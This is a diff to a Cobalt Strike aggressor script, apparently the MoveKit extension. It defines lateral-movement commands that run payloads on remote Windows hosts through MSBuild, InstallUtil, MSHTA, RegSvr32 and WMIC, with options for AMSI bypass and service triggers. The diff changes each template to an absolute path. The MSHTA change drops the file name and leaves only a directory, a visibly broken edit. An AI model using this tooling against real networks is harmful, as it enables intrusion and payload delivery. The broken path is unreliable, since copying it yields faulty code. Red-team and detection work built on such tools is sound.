@@ -49,7 +49,7 @@ alias move-msbuild {
 	$payloadtype = "raw";
 	$compile = "false";
 	$descname = "MSBuild Lateral Movement";
-	$exectemplate = "msbuild.csproj";
+	$exectemplate = "/opt/cobalt_strike_extension_kit/exe/msbuild.csproj";
 	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.csproj", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
 	if ($3 is $null) {
 		berror($bid, "\c4Error: Please specify a listener");
@@ -84,7 +84,7 @@ alias move-installutil {
 	$payloadtype = "raw";
 	$compile = "true";
 	$descname = "InstallUtil Lateral Movement";
-	$exectemplate = "installutil.cs";
+	$exectemplate = "/opt/cobalt_strike_extension_kit/exe/installutil.cs";
 	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
 	if ($3 is $null) {
 		berror($bid, "\c4Error: Please specify a listener");
@@ -121,7 +121,7 @@ alias move-mshta {
 	$payloadtype = "raw";
 	$compile = "false";
 	$descname = "MSHTA Lateral Movement";
-	$exectemplate = "mshta.hta";
+	$exectemplate = "/opt/cobalt_strike_extension_kit/exe/";
 	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.hta", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
 	if ($3 is $null) {
 		berror($bid, "\c4Error: Please specify a listener");
@@ -156,7 +156,7 @@ alias move-regsvr32 {
 	$payloadtype = "raw";
 	$compile = "false";
 	$descname = "RegSvr32 Lateral Movement";
-	$exectemplate = "regsvr32.sct";
+	$exectemplate = "/opt/cobalt_strike_extension_kit/exe/regsvr32.sct";
 	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.sct", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
 	if ($3 is $null) {
 		berror($bid, "\c4Error: Please specify a listener");
@@ -191,7 +191,7 @@ alias move-wmic {
 	$payloadtype = "raw";
 	$compile = "false";
 	$descname = "WMIC Lateral Movement";
-	$exectemplate = "wmic.xsl";
+	$exectemplate = "/opt/cobalt_strike_extension_kit/exe/wmic.xsl";
 	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.xsl", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
 	if ($3 is $null) {
 		berror($bid, "\c4Error: Please specify a listener");
@@ -226,7 +226,7 @@ alias move-nonpre-custom-file {
 	$payloadtype = "raw";
 	$compile = "true";
 	$descname = "NonPreBuiltCustom Lateral Movement";
-	$exectemplate = "custom-nonpre.cs";
+	$exectemplate = "/opt/cobalt_strike_extension_kit/exe/custom-nonpre.cs";
 	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
 	if ($3 is $null) {
 		berror($bid, "\c4Error: Please specify a listener");
@@ -242,7 +242,7 @@ alias move-nonpre-custom-file {
 	&moveKit::prechecks($defaults["bid"], $defaults["listener"], $descname, $null, $defaults["droptype"], $defaults["location"], $2, $defaults["filename"], $defaults["cmdtrigger"], $defaults["auto"]);
 	$latcommand = "". $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
 	if($3['cmdtrigger'] eq "SCM"){
-		$exectemplate = "service-custom-nonpre.cs";
+		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/service-custom-nonpre.cs";
 	}
 	&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
 }
